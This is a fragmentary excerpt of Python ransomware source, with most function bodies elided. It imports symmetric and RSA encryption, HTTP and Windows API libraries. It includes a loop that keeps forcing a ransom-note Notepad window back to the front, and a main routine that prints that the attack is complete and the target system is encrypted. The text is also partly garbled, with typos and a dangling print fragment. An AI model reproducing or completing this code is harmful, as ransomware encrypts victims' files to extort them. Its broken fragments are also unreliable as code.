import win32gui
from cryptography.fernet import Fernet  # Provides symmetric encryption using Fernet (part of the cryptography package)
import os                                # Allows interaction with the operating system (e.g., file management, path handling)
...
import urllib.request                    # Enables fetching data across the web (e.g., downloading files or pages)
import requests                          # Simplifies making HTTP requests (GET, POST, etc.)
import time                              # Provides time-related functions (e.g., sleeping, timestamps)
import datetime                          # Handles date and time operations (e.g., current time, formatting)
import subprocess                        # Allows spawning new processes, connecting to their input/output/error pipes
import win32api                          # Gives access to Windows API functions (e.g., file version info, system operations)
from Crypto.Random import get_random_bytes  # Generates cryptographically secure random bytes
from Crypto.PublicKey import RSA         # Enables creation and management of RSA public/private key pairs
from Crypto.Cipher import AES, PKCS1_OAEP  # Provides symmetric (AES) and asymmetric (RSA-OAEP) encryption capabilities
import base64                            # Provides functions for Base64 encoding/decoding (e.g., for binary-to-text conversions)
    ...
    def show_ransom_notes(self):
        ...
        while True:
            ...
            if top_window=='RANSOM_NOTE - Notepad':
                ...
                print('Ransom not is not the top wiwdow - kill=create process again')
...
def main():
    ...
    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted')  # Debugging/Testing        print(
